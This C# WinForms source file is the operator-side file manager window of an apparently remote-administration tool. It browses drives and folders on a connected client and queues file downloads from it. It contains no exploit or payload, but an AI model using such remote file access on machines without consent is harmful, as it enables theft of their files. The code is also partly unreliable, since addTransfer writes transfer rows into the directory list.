using Serveur.Controllers;
using Serveur.Controllers.Server;
using Serveur.Models;
using Serveur.Packets.ServerPackets;
using System;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmFileManager : Form
    {
        private readonly ClientMosaic _client;
        private string _currentDir;
        private static readonly Random _rnd = new Random(Environment.TickCount);
        private const int TRANSFER_STATUS = 2;
        private const int TRANSFER_ID = 0;

        public FrmFileManager(ClientMosaic client)
        {
            _client = client;
            _client.value.frmFm = this;
            InitializeComponent();
            ListViewItem lvi = new ListViewItem(new string[] { "", "", "", "" });
            lvTransfers.Items.Add(lvi);
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            new GetDrives().Execute(_client);
        }

        public void addDrives(RemoteDrive[] drives)
        {
            try
            {
                cboDrives.Invoke((MethodInvoker)delegate
                {
                    cboDrives.DisplayMember = "DisplayName";
                    cboDrives.ValueMember = "RootDirectory";
                    cboDrives.DataSource = new BindingSource(drives, null);
                });
            }
            catch (InvalidOperationException)
            {

            }
        }

        private void cboDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (_client != null && _client.value != null)
            {
                setCurrentDir(cboDrives.SelectedValue.ToString());
                refreshDirectory();
            }
        }

        public void setStatus(string text, bool setLastDirectorySeen = false)
        {
            try
            {
                if (_client.value != null && setLastDirectorySeen)
                {
                    setCurrentDir(Path.GetFullPath(Path.Combine(_currentDir, @"..\")));
                    _client.value.receivedLastDirectory = true;
                }
                statusStrip.Invoke((MethodInvoker)delegate
                {
                    stripLblStatus.Text = "Status: " + text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void setCurrentDir(string path)
        {
            _currentDir = path;
            try
            {
                txtPath.Invoke((MethodInvoker)delegate
                {
                    txtPath.Text = _currentDir;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private string getAbsolutePath(string item)
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.Length == 1)
                    return Path.Combine(_currentDir, item);
                else
                    return Path.Combine(_currentDir + '/', item);
            }

            return Path.GetFullPath(Path.Combine(_currentDir, item));
        }

        private void navigateUp()
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.LastIndexOf('/') > 0)
                {
                    _currentDir = _currentDir.Remove(_currentDir.LastIndexOf('/') + 1);
                    _currentDir = _currentDir.TrimEnd('/');
                }
                else
                    _currentDir = "/";

                setCurrentDir(_currentDir);
            }
            else
                setCurrentDir(getAbsolutePath(@"..\"));
        }

        private void refreshDirectory()
        {
            if (_client == null || _client.value == null) return;

            if (!_client.value.receivedLastDirectory)
            {
                _client.value.processingDirectory = false;
            }

            new GetDirectory(_currentDir).Execute(_client);
            setStatus("Loading directory content...");
            _client.value.receivedLastDirectory = false;
        }

        public void clearFileBrowser()
        {
            try
            {
                lvDirectory.Invoke((MethodInvoker)delegate
                {
                    lvDirectory.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void addItemToFileBrowser(string name, string size, FrmFileManagerController.PathType type, int imageIndex)
        {
            try
            {
                ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != FrmFileManagerController.PathType.Back) ? type.ToString() : string.Empty })
                {
                    Tag = type,
                    ImageIndex = imageIndex
                };

                lvDirectory.Invoke((MethodInvoker)delegate
                {
                    lvDirectory.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void lvDirectory_DoubleClick(object sender, EventArgs e)
        {
            if(_client != null && _client.value != null && lvDirectory.SelectedItems.Count > 0)
            {
                FrmFileManagerController.PathType type = (FrmFileManagerController.PathType)lvDirectory.SelectedItems[0].Tag;

                switch (type)
                {
                    case FrmFileManagerController.PathType.Back:
                        navigateUp();
                        refreshDirectory();
                        break;
                    case FrmFileManagerController.PathType.Directory:
                        setCurrentDir(getAbsolutePath(lvDirectory.SelectedItems[0].SubItems[0].Text));
                        refreshDirectory();
                        break;
                }
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(ListViewItem files in lvDirectory.SelectedItems)
            {
                FrmFileManagerController.PathType type = (FrmFileManagerController.PathType)files.Tag;

                if(type == FrmFileManagerController.PathType.File)
                {
                    string path = getAbsolutePath(files.SubItems[0].Text);

                    int id = getNewTransferId(files.Index);

                    if(_client  != null)
                    {
                        new DoDownloadFile(path, id).Execute(_client);
                        addTransfer(id, "Download", "Pending...", files.SubItems[0].Text);
                    }
                }
            }
        }

        public static int getNewTransferId(int o = 0)
        {
            return _rnd.Next(0, int.MaxValue) + o;
        }

        public void updateTransferStatus(int index, string status, int imageIndex)
        {
            try
            {
                lvTransfers.Invoke((MethodInvoker)delegate
                {
                    //lvTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
                    //if (imageIndex >= 0)
                    //    lvTransfers.Items[index].ImageIndex = imageIndex;
                    lvTransfers.Invoke((MethodInvoker)delegate
                    {
                        lvTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
                    });

                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception)
            {
            }
        }

        public int getTransferIndex(int id)
        {
            string strId = id.ToString();
            int index = 0;

            try
            {
                lvTransfers.Invoke((MethodInvoker)delegate
                {
                    foreach (ListViewItem lvi in lvTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && strId.Equals(lvi.SubItems[TRANSFER_ID].Text)))
                    {
                        index = lvi.Index;
                        break;
                    }
                });
            }
            catch (InvalidOperationException)
            {
                return -1;
            }

            return index;
        }

        public void addTransfer(int id, string type, string status, string filename)
        {
            try
            {
                ListViewItem lvi =
                    new ListViewItem(new string[] { id.ToString(), type, status, filename });

                lvDirectory.Invoke((MethodInvoker)delegate
                {
                    lvDirectory.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
    }
}
